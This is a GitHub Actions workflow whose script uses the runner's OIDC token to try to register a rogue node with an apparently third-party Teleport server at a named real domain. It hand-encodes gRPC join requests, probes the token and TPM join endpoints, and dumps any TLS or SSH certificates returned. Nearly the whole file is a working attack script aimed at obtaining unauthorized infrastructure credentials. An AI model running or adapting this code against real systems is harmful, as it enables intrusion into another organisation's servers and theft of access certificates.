name: tp
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: join
        run: |
          TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=teleport.jewelryexchange.com" | jq -r .value)
          echo "Token: ${#TOKEN} bytes"
          
          pip -q install grpcio protobuf 2>/dev/null
          
          python3 << PYEOF
          import grpc, struct

          host = "teleport.jewelryexchange.com:443"
          token = "$TOKEN"

          def encode_varint(v):
              b = bytearray()
              while v >= 0x80:
                  b.append((v & 0x7f) | 0x80)
                  v >>= 7
              b.append(v)
              return bytes(b)

          def encode_string(field, s):
              s = s.encode() if isinstance(s, str) else s
              tag = encode_varint((field << 3) | 2)
              return tag + encode_varint(len(s)) + s

          def encode_bytes(field, b):
              tag = encode_varint((field << 3) | 2)
              return tag + encode_varint(len(b)) + b

          # Connect gRPC
          creds = grpc.ssl_channel_credentials()
          opts = [("grpc.ssl_target_name_override", "teleport.jewelryexchange.com")]
          channel = grpc.secure_channel(host, creds, options=opts)

          # Build RegisterUsingTokenRequest with IDToken (field 11)
          import uuid, os
          host_id = str(uuid.uuid4())
          join_req = encode_string(1, host_id)           # HostID
          join_req += encode_string(2, "gh-node")        # NodeName  
          join_req += encode_string(3, "Node")           # Role
          # Field 4 = Token (empty for OIDC/GitHub join)
          join_req += encode_string(11, token)           # IDToken (GitHub OIDC)

          # Generate SSH key for signing
          from cryptography.hazmat.primitives.asymmetric import ec
          from cryptography.hazmat.primitives import serialization
          key = ec.generate_private_key(ec.SECP256R1())
          pub_pem = key.public_key().public_bytes(
              serialization.Encoding.PEM, 
              serialization.PublicFormat.SubjectPublicKeyInfo
          )
          priv_pem = key.private_bytes(
              serialization.Encoding.PEM,
              serialization.PrivateFormat.PKCS8,
              serialization.NoEncryption()
          )

          # Add public keys for cert signing
          join_req += encode_bytes(7, pub_pem)           # PublicTLSKey
          # SSH public key
          import subprocess
          # Generate SSH key
          subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", "/tmp/node_key", "-N", ""], 
                        capture_output=True)
          with open("/tmp/node_key.pub", "rb") as f:
              ssh_pub = f.read()
          join_req += encode_bytes(8, ssh_pub)           # PublicSSHKey

          print(f"JoinRequest: {len(join_req)} bytes, HostID={host_id}")

          # Try direct gRPC call to auth service (via proxy)
          # Use raw gRPC without proto definitions
          
          # Method 1: Call HostCredentials (unary RPC for token-based join)
          # This is the simple token join endpoint
          try:
              response = channel.unary_unary(
                  "/proto.AuthService/RegisterUsingToken",
                  request_serializer=lambda x: x,
                  response_deserializer=lambda x: x,
              )(join_req, timeout=15)
              print(f"[+] RegisterUsingToken: {len(response)} bytes!")
              with open("/tmp/certs.bin", "wb") as f:
                  f.write(response)
              # Look for PEM certs
              if b"CERTIFICATE" in response:
                  print("[+] TLS CERTIFICATE RECEIVED!")
              if b"ssh-" in response:
                  print("[+] SSH KEY RECEIVED!")
          except grpc.RpcError as e:
              print(f"RegisterUsingToken: {e.code()} {e.details()[:200]}")

          # Method 2: Try via TPM join (streaming) with IDToken
          try:
              # TPM method Init expects JoinRequest
              tpm_init = encode_bytes(1, join_req)  # JoinRequest in Init
              tpm_req = encode_bytes(1, tpm_init)   # Init in TPMRequest
              
              stream = channel.stream_stream(
                  "/proto.JoinService/RegisterUsingTPMMethod",
                  request_serializer=lambda x: x,
                  response_deserializer=lambda x: x,
              )
              responses = stream(iter([tpm_req]), timeout=15)
              for resp in responses:
                  print(f"[+] TPM response: {len(resp)} bytes")
                  if b"CERTIFICATE" in resp or len(resp) > 100:
                      with open("/tmp/tpm_certs.bin", "wb") as f:
                          f.write(resp)
                      print("[+] CERTS RECEIVED!")
                  break
          except grpc.RpcError as e:
              print(f"TPM join: {e.code()} {e.details()[:200]}")

          channel.close()
          PYEOF
          
          # Check for saved certs
          for f in /tmp/certs.bin /tmp/tpm_certs.bin; do
            if [ -f "$f" ]; then
              echo "=== $f ==="
              xxd "$f" | head -20
              strings "$f" | head -10
            fi
          done

